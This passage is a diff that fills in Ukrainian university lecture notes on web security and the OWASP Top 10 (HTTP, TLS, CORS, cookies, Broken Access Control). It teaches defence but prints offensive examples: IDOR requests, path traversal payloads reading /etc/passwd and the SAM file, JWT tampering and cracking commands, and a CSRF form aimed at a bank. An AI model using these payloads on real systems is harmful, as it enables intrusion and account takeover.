@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="Конспект лекції 7: Безпека веб-додатків: OWASP Top 10 (Частина 1) — повний текст.">
-  <meta name="author" content="Кафедра інформатики та фізико-математичних дисциплін, УжНУ">
+  <meta name="description" content="Конспект лекції 7: Безпека веб-додатків: OWASP Top 10 (Частина 1) — SQL Injection, Broken Access Control, Cryptographic Failures, Burp Suite, OWASP ZAP.">
+  <meta name="author" content="Кафедра ТЕІБ, УжНУ">
   <meta name="theme-color" content="#0ea5e9">
   <title>Конспект | Лекція 7. Безпека веб-додатків: OWASP Top 10 (Частина 1)</title>
   <link rel="icon" type="image/svg+xml" href="../img/favicon.svg">
@@ -69,18 +69,1736 @@
       <h1>Безпека веб-додатків: OWASP Top 10 (Частина 1)</h1>
       <div class="lecture-info">
         <span><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align: -2px; margin-right: 4px;"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>2 год</span>
-        <span class="badge badge-locked">Скоро</span>
+        <span class="badge badge-new">Нова</span>
       </div>
 
+      <!-- ============================================================ -->
+      <!-- 7.1 Вступ до безпеки веб-додатків                           -->
+      <!-- ============================================================ -->
       <section>
-        <p>Матеріали цього конспекту готуються. Слідкуйте за оновленнями.</p>
+        <h2>7.1 Вступ до безпеки веб-додатків</h2>
+
+        <p>У попередніх лекціях ми вивчали безпеку на рівні мережі та операційних систем: сканування портів, експлуатацію мережевих сервісів, брутфорс паролів. Тепер ми переходимо до найпоширенішого вектора атак у сучасному світі — <strong>веб-додатків</strong>. Згідно зі звітом <strong>Verizon Data Breach Investigations Report (DBIR) 2024</strong>, веб-додатки залучені у 26% усіх підтверджених витоків даних, а 83% зломів здійснюються зовнішніми акторами, які використовують саме веб-вектор як первинну точку входу.</p>
+
+        <p>Причини популярності веб-атак очевидні: веб-додатки доступні з інтернету 24/7, мають складну логіку обробки даних, взаємодіють із базами даних та внутрішніми сервісами, а їхня поверхня атаки постійно зростає через мікросервісну архітектуру та REST/GraphQL API.</p>
+
+        <h3>Протокол HTTP: фундамент веб-комунікації</h3>
+        <p><strong>HTTP</strong> (HyperText Transfer Protocol) — це протокол прикладного рівня, розроблений Тімом Бернерсом-Лі у 1991 році (HTTP/0.9). Поточні версії: HTTP/1.1 (RFC 2616, 1999), HTTP/2 (RFC 7540, 2015), HTTP/3 (RFC 9114, 2022, на базі QUIC/UDP). HTTP є <strong>stateless</strong>-протоколом — кожен запит незалежний, сервер не зберігає стан між запитами (для цього використовуються cookies та сесії).</p>
+
+        <h3>HTTP-методи</h3>
+        <table>
+          <tr>
+            <th>Метод</th>
+            <th>Опис</th>
+            <th>Ідемпотентний</th>
+            <th>Тіло запиту</th>
+            <th>Безпечний</th>
+          </tr>
+          <tr>
+            <td><strong>GET</strong></td>
+            <td>Отримання ресурсу. Параметри у URL (?key=value)</td>
+            <td>Так</td>
+            <td>Ні</td>
+            <td>Так</td>
+          </tr>
+          <tr>
+            <td><strong>POST</strong></td>
+            <td>Надсилання даних для обробки (форми, завантаження)</td>
+            <td>Ні</td>
+            <td>Так</td>
+            <td>Ні</td>
+          </tr>
+          <tr>
+            <td><strong>PUT</strong></td>
+            <td>Заміна ресурсу цілком</td>
+            <td>Так</td>
+            <td>Так</td>
+            <td>Ні</td>
+          </tr>
+          <tr>
+            <td><strong>DELETE</strong></td>
+            <td>Видалення ресурсу</td>
+            <td>Так</td>
+            <td>Ні</td>
+            <td>Ні</td>
+          </tr>
+          <tr>
+            <td><strong>PATCH</strong></td>
+            <td>Часткове оновлення ресурсу</td>
+            <td>Ні</td>
+            <td>Так</td>
+            <td>Ні</td>
+          </tr>
+          <tr>
+            <td><strong>OPTIONS</strong></td>
+            <td>Запит дозволених методів (preflight CORS)</td>
+            <td>Так</td>
+            <td>Ні</td>
+            <td>Так</td>
+          </tr>
+          <tr>
+            <td><strong>HEAD</strong></td>
+            <td>Як GET, але без тіла відповіді (лише заголовки)</td>
+            <td>Так</td>
+            <td>Ні</td>
+            <td>Так</td>
+          </tr>
+        </table>
+
+        <h3>Коди стану HTTP</h3>
+        <table>
+          <tr>
+            <th>Діапазон</th>
+            <th>Категорія</th>
+            <th>Приклади</th>
+          </tr>
+          <tr>
+            <td><strong>1xx</strong></td>
+            <td>Інформаційні</td>
+            <td>100 Continue, 101 Switching Protocols, 103 Early Hints</td>
+          </tr>
+          <tr>
+            <td><strong>2xx</strong></td>
+            <td>Успіх</td>
+            <td>200 OK, 201 Created, 204 No Content, 206 Partial Content</td>
+          </tr>
+          <tr>
+            <td><strong>3xx</strong></td>
+            <td>Перенаправлення</td>
+            <td>301 Moved Permanently, 302 Found, 304 Not Modified, 307 Temporary Redirect</td>
+          </tr>
+          <tr>
+            <td><strong>4xx</strong></td>
+            <td>Помилка клієнта</td>
+            <td>400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 405 Method Not Allowed, 429 Too Many Requests</td>
+          </tr>
+          <tr>
+            <td><strong>5xx</strong></td>
+            <td>Помилка сервера</td>
+            <td>500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable, 504 Gateway Timeout</td>
+          </tr>
+        </table>
+
+        <h3>Анатомія HTTP-запиту та відповіді</h3>
+        <pre><code># HTTP-запит (приклад)
+GET /api/users?id=42 HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Accept: text/html,application/json
+Cookie: session=abc123def456
+Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
+Referer: https://example.com/dashboard
+X-Forwarded-For: 203.0.113.50
+
+# HTTP-відповідь (приклад)
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+Set-Cookie: session=abc123def456; HttpOnly; Secure; SameSite=Strict
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
+Content-Length: 156
+
+{"id": 42, "name": "John Doe", "email": "john@example.com"}</code></pre>
+
+        <h3>Важливі HTTP-заголовки</h3>
+        <table>
+          <tr>
+            <th>Заголовок</th>
+            <th>Тип</th>
+            <th>Призначення</th>
+            <th>Значення для безпеки</th>
+          </tr>
+          <tr>
+            <td><strong>Host</strong></td>
+            <td>Запит</td>
+            <td>Ім'я цільового сервера</td>
+            <td>Host Header Injection, virtual host routing</td>
+          </tr>
+          <tr>
+            <td><strong>Cookie</strong></td>
+            <td>Запит</td>
+            <td>Передача сесійних даних</td>
+            <td>Session hijacking, XSS-крадіжка</td>
+          </tr>
+          <tr>
+            <td><strong>Set-Cookie</strong></td>
+            <td>Відповідь</td>
+            <td>Встановлення cookie у браузері</td>
+            <td>Атрибути HttpOnly, Secure, SameSite</td>
+          </tr>
+          <tr>
+            <td><strong>Authorization</strong></td>
+            <td>Запит</td>
+            <td>Облікові дані (Basic, Bearer)</td>
+            <td>Витік токенів, brute force</td>
+          </tr>
+          <tr>
+            <td><strong>Content-Type</strong></td>
+            <td>Обидва</td>
+            <td>MIME-тип тіла повідомлення</td>
+            <td>Content-Type sniffing, XXE</td>
+          </tr>
+          <tr>
+            <td><strong>User-Agent</strong></td>
+            <td>Запит</td>
+            <td>Ідентифікація клієнта (браузер, ОС)</td>
+            <td>Фінгерпринтінг, обхід фільтрів</td>
+          </tr>
+          <tr>
+            <td><strong>Referer</strong></td>
+            <td>Запит</td>
+            <td>URL попередньої сторінки</td>
+            <td>Витік чутливих параметрів з URL</td>
+          </tr>
+          <tr>
+            <td><strong>X-Forwarded-For</strong></td>
+            <td>Запит</td>
+            <td>IP клієнта за проксі/балансувальником</td>
+            <td>IP spoofing, обхід rate limiting</td>
+          </tr>
+        </table>
+
+        <h3>HTTPS та TLS</h3>
+        <p><strong>HTTPS</strong> (HTTP Secure) — це HTTP поверх TLS (Transport Layer Security). TLS забезпечує три ключові властивості:</p>
+        <ul>
+          <li><strong>Конфіденційність</strong> — шифрування даних між клієнтом і сервером (AES-256-GCM, ChaCha20-Poly1305)</li>
+          <li><strong>Цілісність</strong> — виявлення будь-якої модифікації даних у транзиті (HMAC, AEAD)</li>
+          <li><strong>Автентичність</strong> — перевірка ідентичності сервера через X.509 сертифікат, підписаний довіреним CA</li>
+        </ul>
+        <table>
+          <tr>
+            <th>Параметр</th>
+            <th>TLS 1.2 (2008)</th>
+            <th>TLS 1.3 (2018, RFC 8446)</th>
+          </tr>
+          <tr>
+            <td><strong>Handshake</strong></td>
+            <td>2-RTT (2 round-trips)</td>
+            <td>1-RTT (+ 0-RTT resumption)</td>
+          </tr>
+          <tr>
+            <td><strong>Cipher suites</strong></td>
+            <td>37 підтримуваних (багато слабких)</td>
+            <td>5 сильних (TLS_AES_256_GCM_SHA384 та ін.)</td>
+          </tr>
+          <tr>
+            <td><strong>Perfect Forward Secrecy</strong></td>
+            <td>Опціонально (ECDHE)</td>
+            <td>Обов'язково для всіх з'єднань</td>
+          </tr>
+          <tr>
+            <td><strong>Видалено у TLS 1.3</strong></td>
+            <td>-</td>
+            <td>RSA key exchange, RC4, DES, 3DES, MD5, SHA-1, CBC mode, static DH</td>
+          </tr>
+        </table>
+
+        <h3>Архітектура веб-додатку</h3>
+        <p>Типова багаторівнева архітектура веб-додатку:</p>
+        <ol>
+          <li><strong>Клієнт (браузер)</strong> — HTML/CSS/JavaScript, рендеринг UI, відправка HTTP-запитів</li>
+          <li><strong>Веб-сервер (Nginx / Apache)</strong> — прийом HTTP-запитів, статичні файли, reverse proxy, TLS-термінація</li>
+          <li><strong>Сервер додатку (PHP / Python / Node.js / Java / .NET)</strong> — бізнес-логіка, обробка даних, API</li>
+          <li><strong>База даних (MySQL / PostgreSQL / MongoDB)</strong> — зберігання та запити до даних</li>
+          <li><strong>Кеш (Redis / Memcached)</strong> — сесії, кеш відповідей, черги</li>
+          <li><strong>Зовнішні сервіси</strong> — платіжні системи, email (SMTP), CDN, cloud storage</li>
+        </ol>
+
+        <h3>Поверхня атаки веб-додатку</h3>
+        <table>
+          <tr>
+            <th>Рівень</th>
+            <th>Вектори атак</th>
+            <th>Приклади</th>
+          </tr>
+          <tr>
+            <td><strong>Frontend (клієнт)</strong></td>
+            <td>XSS, Clickjacking, CSRF, DOM manipulation</td>
+            <td>Впровадження скриптів, підміна UI, крадіжка cookies</td>
+          </tr>
+          <tr>
+            <td><strong>Backend (сервер)</strong></td>
+            <td>SQLi, Command Injection, SSRF, SSTI, File Upload</td>
+            <td>Виконання коду на сервері, доступ до БД</td>
+          </tr>
+          <tr>
+            <td><strong>Інфраструктура</strong></td>
+            <td>Misconfiguration, exposed panels, default credentials</td>
+            <td>Відкриті /admin, /phpmyadmin, debug mode</td>
+          </tr>
+          <tr>
+            <td><strong>API</strong></td>
+            <td>Broken authentication, BOLA/IDOR, mass assignment</td>
+            <td>Несанкціонований доступ через REST/GraphQL</td>
+          </tr>
+        </table>
+
+        <h3>Same-Origin Policy (SOP) та CORS</h3>
+        <p><strong>Same-Origin Policy (SOP)</strong> — фундаментальний механізм безпеки браузера, запроваджений Netscape у 1995 році. SOP забороняє скриптам одного origin читати дані іншого origin. <strong>Origin</strong> визначається трьома компонентами:</p>
+        <ul>
+          <li><strong>Протокол</strong> (http vs https — різні origins)</li>
+          <li><strong>Хост</strong> (example.com vs api.example.com — різні origins)</li>
+          <li><strong>Порт</strong> (example.com:80 vs example.com:8080 — різні origins)</li>
+        </ul>
+        <p><strong>CORS</strong> (Cross-Origin Resource Sharing) — контрольоване послаблення SOP. Сервер явно дозволяє певним origins доступ до своїх ресурсів через заголовки відповіді:</p>
+        <pre><code># Сервер дозволяє запити з конкретного origin
+Access-Control-Allow-Origin: https://trusted-app.com
+Access-Control-Allow-Methods: GET, POST, PUT
+Access-Control-Allow-Headers: Content-Type, Authorization
+Access-Control-Allow-Credentials: true
+
+# Preflight-запит (OPTIONS) — браузер автоматично надсилає
+# перед cross-origin запитами з нестандартними методами або заголовками
+OPTIONS /api/data HTTP/1.1
+Origin: https://trusted-app.com
+Access-Control-Request-Method: PUT</code></pre>
+
+        <h3>Cookies: управління сесіями</h3>
+        <p>Оскільки HTTP є stateless, <strong>cookies</strong> використовуються для підтримки стану (сесії, автентифікація, персоналізація). Атрибути безпеки cookies:</p>
+        <table>
+          <tr>
+            <th>Атрибут</th>
+            <th>Призначення</th>
+            <th>Рекомендація</th>
+          </tr>
+          <tr>
+            <td><strong>HttpOnly</strong></td>
+            <td>Забороняє доступ із JavaScript (document.cookie)</td>
+            <td>Завжди для сесійних cookies — захист від XSS</td>
+          </tr>
+          <tr>
+            <td><strong>Secure</strong></td>
+            <td>Передається тільки через HTTPS</td>
+            <td>Завжди — запобігає перехопленню у мережі</td>
+          </tr>
+          <tr>
+            <td><strong>SameSite</strong></td>
+            <td>Контроль cross-site відправки cookie</td>
+            <td>Strict або Lax — захист від CSRF-атак</td>
+          </tr>
+          <tr>
+            <td><strong>Domain</strong></td>
+            <td>Домен, для якого cookie діє</td>
+            <td>Максимально вузький scope</td>
+          </tr>
+          <tr>
+            <td><strong>Path</strong></td>
+            <td>Шлях URL, для якого cookie діє</td>
+            <td>Обмежити до необхідного шляху</td>
+          </tr>
+          <tr>
+            <td><strong>Expires / Max-Age</strong></td>
+            <td>Час життя cookie</td>
+            <td>Мінімально необхідний термін</td>
+          </tr>
+        </table>
+        <pre><code># Приклад безпечного Set-Cookie заголовка
+Set-Cookie: sessionId=a1b2c3d4e5; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600</code></pre>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 7.2 OWASP Foundation та Top 10: 2021                         -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>7.2 OWASP Foundation та Top 10: 2021</h2>
+
+        <p><strong>OWASP</strong> (Open Worldwide Application Security Project, до 2023 — Open Web Application Security Project) — це міжнародна некомерційна організація, присвячена покращенню безпеки програмного забезпечення. Заснована у 2001 році <strong>Марком Керфі</strong> (Mark Curphey), OWASP стала некомерційною організацією (501(c)(3)) у 2004 році. Станом на 2024 рік OWASP нараховує <strong>250+ локальних чаптерів</strong> у 90+ країнах та понад <strong>45,000 учасників</strong>.</p>
+
+        <h3>Ключові проєкти OWASP</h3>
+        <table>
+          <tr>
+            <th>Проєкт</th>
+            <th>Тип</th>
+            <th>Опис</th>
+          </tr>
+          <tr>
+            <td><strong>OWASP Top 10</strong></td>
+            <td>Документ</td>
+            <td>Перелік 10 найкритичніших ризиків безпеки веб-додатків</td>
+          </tr>
+          <tr>
+            <td><strong>ASVS</strong></td>
+            <td>Стандарт</td>
+            <td>Application Security Verification Standard — 286 вимог на 3 рівнях</td>
+          </tr>
+          <tr>
+            <td><strong>Testing Guide v4.2</strong></td>
+            <td>Методологія</td>
+            <td>Посібник з тестування безпеки: 91 тест-кейс у 11 категоріях</td>
+          </tr>
+          <tr>
+            <td><strong>Cheat Sheet Series</strong></td>
+            <td>Документ</td>
+            <td>80+ коротких довідників з конкретних тем безпеки</td>
+          </tr>
+          <tr>
+            <td><strong>ZAP</strong></td>
+            <td>Інструмент</td>
+            <td>Zed Attack Proxy — безкоштовний проксі для тестування веб-безпеки</td>
+          </tr>
+          <tr>
+            <td><strong>SAMM</strong></td>
+            <td>Модель</td>
+            <td>Software Assurance Maturity Model — оцінка зрілості безпеки SDLC</td>
+          </tr>
+          <tr>
+            <td><strong>Juice Shop</strong></td>
+            <td>Навчальна платформа</td>
+            <td>Вразливий веб-додаток (Node.js/Angular) з 100+ вразливостями</td>
+          </tr>
+          <tr>
+            <td><strong>WebGoat</strong></td>
+            <td>Навчальна платформа</td>
+            <td>Java-додаток з покроковими уроками з веб-безпеки</td>
+          </tr>
+          <tr>
+            <td><strong>ModSecurity CRS</strong></td>
+            <td>Інструмент</td>
+            <td>Core Rule Set — правила WAF для захисту від типових атак</td>
+          </tr>
+        </table>
+
+        <h3>Еволюція OWASP Top 10</h3>
+        <table>
+          <tr>
+            <th>Рік</th>
+            <th>Ключові зміни</th>
+          </tr>
+          <tr>
+            <td><strong>2004</strong></td>
+            <td>Перша версія. 7 з 10 категорій стосувались input validation</td>
+          </tr>
+          <tr>
+            <td><strong>2007</strong></td>
+            <td>Реструктурований. XSS та Injection виділені як окремі категорії</td>
+          </tr>
+          <tr>
+            <td><strong>2010</strong></td>
+            <td>Перехід на ризик-орієнтований підхід (likelihood + impact)</td>
+          </tr>
+          <tr>
+            <td><strong>2013</strong></td>
+            <td>Додано "Using Components with Known Vulnerabilities"</td>
+          </tr>
+          <tr>
+            <td><strong>2017</strong></td>
+            <td>Додано XXE та Insecure Deserialization. XSS — окрема категорія A07</td>
+          </tr>
+          <tr>
+            <td><strong>2021</strong></td>
+            <td>Data-driven підхід. 3 нові категорії. XSS об'єднаний з Injection. Broken Access Control стає #1</td>
+          </tr>
+        </table>
+
+        <h3>Методологія формування Top 10: 2021</h3>
+        <p>Список OWASP Top 10: 2021 сформований двома методами:</p>
+        <ul>
+          <li><strong>Data-driven (8 категорій):</strong> реальні дані від 13+ організацій, що охоплюють 500,000+ додатків та понад 400 типів вразливостей (CWE). Метрики: incidence rate (% додатків з вразливістю), coverage, weighted exploit та impact score</li>
+          <li><strong>Survey-driven (2 категорії):</strong> опитування спільноти безпеки (400+ респондентів) для виявлення ризиків, які ще не достатньо представлені у даних. Результати опитування: A04 Insecure Design та A08 Software and Data Integrity Failures</li>
+        </ul>
+
+        <h3>OWASP Top 10 — 2021: повний перелік</h3>
+        <table>
+          <tr>
+            <th>#</th>
+            <th>Категорія</th>
+            <th>CWEs</th>
+            <th>Incidence Rate</th>
+            <th>Зміна з 2017</th>
+          </tr>
+          <tr>
+            <td><strong>A01</strong></td>
+            <td>Broken Access Control</td>
+            <td>34</td>
+            <td>3.81%</td>
+            <td>Було #5 &rarr; #1</td>
+          </tr>
+          <tr>
+            <td><strong>A02</strong></td>
+            <td>Cryptographic Failures</td>
+            <td>29</td>
+            <td>4.49%</td>
+            <td>Було #3 (перейменовано)</td>
+          </tr>
+          <tr>
+            <td><strong>A03</strong></td>
+            <td>Injection</td>
+            <td>33</td>
+            <td>3.37%</td>
+            <td>Було #1 &rarr; #3; XSS включено</td>
+          </tr>
+          <tr>
+            <td><strong>A04</strong></td>
+            <td>Insecure Design</td>
+            <td>40</td>
+            <td>3.00%</td>
+            <td>НОВА категорія</td>
+          </tr>
+          <tr>
+            <td><strong>A05</strong></td>
+            <td>Security Misconfiguration</td>
+            <td>20</td>
+            <td>4.51%</td>
+            <td>Було #6; XXE включено</td>
+          </tr>
+          <tr>
+            <td><strong>A06</strong></td>
+            <td>Vulnerable and Outdated Components</td>
+            <td>3</td>
+            <td>8.77%</td>
+            <td>Було #9 &rarr; #6</td>
+          </tr>
+          <tr>
+            <td><strong>A07</strong></td>
+            <td>Identification and Authentication Failures</td>
+            <td>22</td>
+            <td>2.55%</td>
+            <td>Було #2 (перейменовано)</td>
+          </tr>
+          <tr>
+            <td><strong>A08</strong></td>
+            <td>Software and Data Integrity Failures</td>
+            <td>10</td>
+            <td>2.05%</td>
+            <td>НОВА; Insecure Deserialization включено</td>
+          </tr>
+          <tr>
+            <td><strong>A09</strong></td>
+            <td>Security Logging and Monitoring Failures</td>
+            <td>4</td>
+            <td>6.51%</td>
+            <td>Було #10 (розширено)</td>
+          </tr>
+          <tr>
+            <td><strong>A10</strong></td>
+            <td>Server-Side Request Forgery (SSRF)</td>
+            <td>1</td>
+            <td>2.72%</td>
+            <td>НОВА категорія</td>
+          </tr>
+        </table>
+
+        <h3>Зміни 2017 &rarr; 2021</h3>
+        <ul>
+          <li><strong>Об'єднані:</strong> XSS (A07:2017) &rarr; A03 Injection; XXE (A04:2017) &rarr; A05 Security Misconfiguration; Insecure Deserialization (A08:2017) &rarr; A08 Software and Data Integrity Failures</li>
+          <li><strong>Нові категорії:</strong> A04 Insecure Design, A08 Software and Data Integrity Failures (частково), A10 SSRF</li>
+          <li><strong>Перейменовані:</strong> Sensitive Data Exposure &rarr; Cryptographic Failures (фокус на причині); Broken Authentication &rarr; Identification and Authentication Failures</li>
+          <li><strong>Зміна позицій:</strong> Broken Access Control піднявся з #5 на #1; Injection впав з #1 на #3 завдяки параметризованим запитам та ORM</li>
+        </ul>
+
+        <h3>OWASP Top 10: 2025</h3>
+        <p>У 2025 році OWASP анонсувала оновлення Top 10. Серед очікуваних змін: посилений фокус на <strong>API Security</strong> (OWASP API Security Top 10 існує окремо з 2019 року), <strong>AI/ML-специфічні ризики</strong> (prompt injection, model poisoning) та <strong>supply chain attacks</strong> (зростання після інцидентів SolarWinds, XZ Utils, Polyfill.io). OWASP також розвиває окремий <strong>Top 10 for LLM Applications</strong> (v1.1, 2024).</p>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 7.3 A01: Порушення контролю доступу                         -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>7.3 A01: Порушення контролю доступу (Broken Access Control)</h2>
+
+        <p><strong>Контроль доступу</strong> (Access Control) — це механізм, який забезпечує, що користувачі можуть діяти лише в межах наданих їм повноважень. Порушення контролю доступу означає, що обмеження не дотримуються, і користувачі можуть виконувати дії або отримувати дані, на які не мають права.</p>
+
+        <p>У 2021 році ця категорія піднялась з позиції #5 на <strong>#1</strong> — найкритичніший ризик. Статистика: <strong>94% протестованих додатків</strong> мали форму порушення контролю доступу, з <strong>318,000+ виявлених випадків</strong> та <strong>34 пов'язаними CWE</strong>.</p>
+
+        <h3>Ключові CWE</h3>
+        <ul>
+          <li><strong>CWE-200</strong> — Exposure of Sensitive Information to an Unauthorized Actor</li>
+          <li><strong>CWE-201</strong> — Insertion of Sensitive Information Into Sent Data</li>
+          <li><strong>CWE-284</strong> — Improper Access Control</li>
+          <li><strong>CWE-285</strong> — Improper Authorization</li>
+          <li><strong>CWE-352</strong> — Cross-Site Request Forgery (CSRF)</li>
+          <li><strong>CWE-639</strong> — Authorization Bypass Through User-Controlled Key (IDOR)</li>
+        </ul>
+
+        <h3>IDOR (Insecure Direct Object Reference)</h3>
+        <p><strong>IDOR</strong> — одна з найпоширеніших вразливостей контролю доступу. Виникає, коли додаток використовує прямі посилання на внутрішні об'єкти (ID у базі даних) без перевірки повноважень поточного користувача.</p>
+        <pre><code># Нормальний запит — отримання свого профілю
+GET /api/users/1001 HTTP/1.1
+Cookie: session=user1001_token
+
+# IDOR-атака — зміна ID для доступу до чужого профілю
+GET /api/users/1002 HTTP/1.1
+Cookie: session=user1001_token
+# Сервер повертає дані користувача 1002 без перевірки!
+
+# IDOR у POST-запиті — зміна чужого пароля
+POST /api/users/1002/password HTTP/1.1
+Cookie: session=user1001_token
+Content-Type: application/json
+
+{"new_password": "hacked123"}</code></pre>
+
+        <p><strong>Реальні випадки IDOR:</strong></p>
+        <ul>
+          <li><strong>Facebook (2015)</strong> — дослідник виявив IDOR у Graph API, що дозволяв видаляти фото будь-якого користувача. Bug bounty: $12,500</li>
+          <li><strong>US Army (2016)</strong> — IDOR на порталі дозволяв доступ до особових справ усіх військовослужбовців</li>
+          <li><strong>Uber (2019)</strong> — IDOR в API дозволяв отримати поїздки будь-якого водія, включаючи GPS-координати</li>
+        </ul>
+
+        <h3>Вертикальна ескалація привілеїв</h3>
+        <p>Користувач з обмеженими правами отримує доступ до функцій адміністратора:</p>
+        <pre><code># Прямий доступ до адмін-панелі без перевірки ролі
+GET /admin/dashboard HTTP/1.1
+Cookie: session=regular_user_token
+# Відповідь: 200 OK — сторінка відображається!
+
+# Маніпуляція роллю у тілі запиту
+POST /api/users/register HTTP/1.1
+Content-Type: application/json
+
+{"username": "hacker", "password": "pass123", "role": "admin"}
+# Сервер приймає role без серверної валідації!
+
+# Маніпуляція JWT-токеном
+# Оригінальний payload: {"sub":"1001","role":"user","exp":1700000000}
+# Модифікований:        {"sub":"1001","role":"admin","exp":1700000000}
+# Працює якщо сервер не валідує підпис або використовує слабкий secret</code></pre>
+
+        <h3>Горизонтальна ескалація привілеїв</h3>
+        <p>Користувач А отримує доступ до даних або функцій користувача Б (того самого рівня привілеїв). Часто реалізується через IDOR на user-specific endpoints:</p>
+        <pre><code># Доступ до чужих замовлень
+GET /api/orders/54321 HTTP/1.1
+Authorization: Bearer user_A_token
+# Замовлення 54321 належить user_B, але сервер не перевіряє ownership
+
+# Доступ до чужих повідомлень
+GET /api/messages?user_id=1002 HTTP/1.1
+Cookie: session=user_1001</code></pre>
+
+        <h3>Path Traversal (Directory Traversal)</h3>
+        <p>Маніпуляція шляхами файлів для доступу до файлів за межами дозволеної директорії:</p>
+        <pre><code># Базова атака
+GET /download?file=../../../../etc/passwd HTTP/1.1
+
+# URL-кодування для обходу фільтрів
+GET /download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1
+
+# Подвійне кодування
+GET /download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1
+
+# Null byte injection (застарілі C-based системи)
+GET /download?file=../../../../etc/passwd%00.jpg HTTP/1.1
+
+# Windows-варіант
+GET /download?file=..\..\..\..\windows\system32\config\sam HTTP/1.1</code></pre>
+
+        <h3>CORS Misconfiguration</h3>
+        <p>Неправильна конфігурація CORS може дозволити зловмисному сайту читати дані з API від імені авторизованого користувача:</p>
+        <pre><code># НЕБЕЗПЕЧНО: дзеркальне відображення будь-якого Origin
+Access-Control-Allow-Origin: https://evil.com   # Відображає будь-який Origin!
+Access-Control-Allow-Credentials: true           # Дозволяє надсилати cookies!
+# Результат: evil.com може читати дані авторизованого користувача
+
+# НЕБЕЗПЕЧНО: wildcard
+Access-Control-Allow-Origin: *
+
+# ПРАВИЛЬНО: білий список origins
+Access-Control-Allow-Origin: https://trusted-app.com
+Access-Control-Allow-Credentials: true</code></pre>
+
+        <h3>JWT Token Manipulation</h3>
+        <p>JSON Web Token (JWT) широко використовується для автентифікації в REST API. Типові атаки:</p>
+        <ul>
+          <li><strong>None Algorithm Attack:</strong> зміна алгоритму на "none" у заголовку JWT — якщо сервер не валідує алгоритм, токен приймається без підпису</li>
+          <li><strong>Algorithm Confusion (RS256 &rarr; HS256):</strong> зміна асиметричного на симетричний алгоритм і підписання публічним ключем як shared secret</li>
+          <li><strong>Weak Secret:</strong> brute-force секрету підпису (наприклад, "secret", "password123"). Інструменти: hashcat, jwt_tool</li>
+          <li><strong>Payload Manipulation:</strong> зміна полів role, user_id, exp (expiration) у payload</li>
+        </ul>
+        <pre><code># Структура JWT: header.payload.signature (Base64URL)
+# eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMDAxIiwicm9sZSI6InVzZXIifQ.signature
+
+# jwt_tool — інструмент для тестування JWT
+python3 jwt_tool.py TOKEN -T              # Tampering — інтерактивна зміна
+python3 jwt_tool.py TOKEN -X a            # None algorithm attack
+python3 jwt_tool.py TOKEN -C -d wordlist.txt  # Crack secret
+
+# hashcat — brute-force JWT secret
+hashcat -m 16500 jwt_hash.txt wordlist.txt</code></pre>
+
+        <h3>CSRF (Cross-Site Request Forgery)</h3>
+        <p><strong>CSRF</strong> — атака, при якій зловмисний сайт виконує дію від імені автентифікованого користувача, використовуючи його активну сесію:</p>
+        <pre><code>&lt;!-- Зловмисна HTML-сторінка, яка змінює email жертви --&gt;
+&lt;html&gt;
+&lt;body onload="document.getElementById('csrf-form').submit();"&gt;
+  &lt;form id="csrf-form" action="https://bank.com/api/change-email" method="POST"&gt;
+    &lt;input type="hidden" name="email" value="attacker@evil.com" /&gt;
+  &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+
+        <h3>Запобігання: Broken Access Control</h3>
+        <ul>
+          <li><strong>Deny by default:</strong> за замовчуванням забороняти доступ, явно дозволяти лише необхідне</li>
+          <li><strong>Перевірка авторизації на кожному запиті:</strong> server-side, не довіряти клієнту</li>
+          <li><strong>Серверні сесії:</strong> session ID у cookie (HttpOnly, Secure, SameSite), не в URL</li>
+          <li><strong>Логування відмов доступу:</strong> alert на масові 403/401 з одного IP</li>
+          <li><strong>Rate limiting:</strong> обмеження кількості запитів (429 Too Many Requests)</li>
+          <li><strong>Disable directory listing:</strong> Nginx (<code>autoindex off;</code>), Apache (<code>Options -Indexes</code>)</li>
+          <li><strong>Invalidate sessions on logout:</strong> серверне видалення сесії, не лише cookie</li>
+          <li><strong>CSRF-токени:</strong> унікальний per-request або per-session токен</li>
+          <li><strong>Autorize (Burp extension):</strong> автоматичне тестування контролю доступу</li>
+        </ul>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 7.4 A02: Криптографічні збої                                 -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>7.4 A02: Криптографічні збої (Cryptographic Failures)</h2>
+
+        <p>Категорія перейменована з "Sensitive Data Exposure" (A03:2017) на <strong>"Cryptographic Failures"</strong>, щоб зосередити увагу на <strong>кореневій причині</strong> — неправильному або відсутньому використанні криптографії — а не на наслідку (витік). Ключові CWE: <strong>CWE-259</strong> (Use of Hard-coded Password), <strong>CWE-327</strong> (Use of Broken Cryptographic Algorithm), <strong>CWE-331</strong> (Insufficient Entropy).</p>
+
+        <h3>Класифікація чутливих даних</h3>
+        <table>
+          <tr>
+            <th>Тип даних</th>
+            <th>Приклади</th>
+            <th>Регулятор / Стандарт</th>
+          </tr>
+          <tr>
+            <td><strong>PII</strong> (Personally Identifiable Information)</td>
+            <td>Ім'я, email, телефон, адреса, ІПН, паспорт</td>
+            <td>GDPR (ЄС), CCPA (Каліфорнія)</td>
+          </tr>
+          <tr>
+            <td><strong>PHI</strong> (Protected Health Information)</td>
+            <td>Медичні записи, діагнози, рецепти</td>
+            <td>HIPAA (США)</td>
+          </tr>
+          <tr>
